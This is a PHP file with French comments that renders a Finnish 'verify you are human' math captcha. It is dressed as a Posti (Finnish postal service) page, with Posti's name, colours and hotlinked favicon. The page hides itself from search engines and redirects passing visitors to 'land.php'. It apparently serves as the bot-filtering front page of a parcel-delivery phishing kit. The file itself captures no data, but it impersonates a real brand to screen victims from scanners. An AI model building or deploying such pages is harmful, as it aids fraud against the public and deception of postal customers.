<?php
session_start();

// Générer un nouveau captcha
if (!isset($_SESSION['captcha_num1']) || isset($_GET['refresh'])) {
    $_SESSION['captcha_num1'] = rand(1, 10);
    $_SESSION['captcha_num2'] = rand(1, 10);
    $_SESSION['captcha_answer'] = $_SESSION['captcha_num1'] + $_SESSION['captcha_num2'];
    $_SESSION['captcha_time'] = time();
}

$error = false;

// Vérifier la réponse
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $answer = intval($_POST['answer'] ?? 0);

    // Vérifier temps (max 2 min)
    if (time() - ($_SESSION['captcha_time'] ?? 0) > 120) {
        $error = 'expired';
    } elseif ($answer === $_SESSION['captcha_answer']) {
        // Correct !
        $_SESSION['captcha_passed'] = true;
        $_SESSION['captcha_passed_time'] = time();

        // Rediriger vers la page demandée
        $redirect = $_SESSION['captcha_redirect'] ?? 'land.php';
        unset($_SESSION['captcha_redirect']);
        header('Location: ' . $redirect);
        exit;
    } else {
        $error = 'wrong';
        // Nouveau captcha
        $_SESSION['captcha_num1'] = rand(1, 10);
        $_SESSION['captcha_num2'] = rand(1, 10);
        $_SESSION['captcha_answer'] = $_SESSION['captcha_num1'] + $_SESSION['captcha_num2'];
    }
}

$num1 = $_SESSION['captcha_num1'];
$num2 = $_SESSION['captcha_num2'];
?>
<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Vahvistus - Posti</title>
    <link rel="icon" href="https://www.posti.fi/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: white;
            padding: 12px 20px;
            border-bottom: 1px solid #e0e0e0;
        }
        .logo {
            font-size: 26px;
            font-weight: 900;
            font-style: italic;
            color: #FF6200;
        }
        .content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .icon {
            width: 70px;
            height: 70px;
            background: #FFF3E0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        .icon svg {
            width: 36px;
            height: 36px;
            fill: #FF6200;
        }
        h1 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .captcha-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 20px;
        }
        .question {
            font-size: 32px;
            font-weight: 700;
            color: #333;
            margin-bottom: 16px;
        }
        .input-row {
            display: flex;
            gap: 12px;
        }
        input[type="number"] {
            flex: 1;
            padding: 14px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 18px;
            text-align: center;
            outline: none;
        }
        input[type="number"]:focus {
            border-color: #FF6200;
        }
        button {
            padding: 14px 28px;
            background: #FF6200;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            background: #e55a00;
        }
        .error {
            background: #FFEBEE;
            color: #C62828;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 14px;
        }
        .info {
            font-size: 12px;
            color: #999;
            margin-top: 16px;
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="logo">posti</span>
    </div>
    <div class="content">
        <div class="card">
            <div class="icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            </div>
            <h1>Vahvista, että olet ihminen</h1>
            <p>Ratkaise alla oleva laskutoimitus jatkaaksesi</p>

            <?php if ($error === 'wrong'): ?>
            <div class="error">Väärä vastaus. Yritä uudelleen.</div>
            <?php elseif ($error === 'expired'): ?>
            <div class="error">Aika loppui. Yritä uudelleen.</div>
            <?php endif; ?>

            <form method="POST">
                <div class="captcha-box">
                    <div class="question"><?php echo $num1; ?> + <?php echo $num2; ?> = ?</div>
                    <div class="input-row">
                        <input type="number" name="answer" placeholder="Vastaus" required autofocus min="0" max="20">
                        <button type="submit">Vahvista</button>
                    </div>
                </div>
            </form>

            <p class="info">Tämä varmistus suojaa palvelua automaattisilta pyynnöiltä.</p>
        </div>
    </div>
</body>
</html>
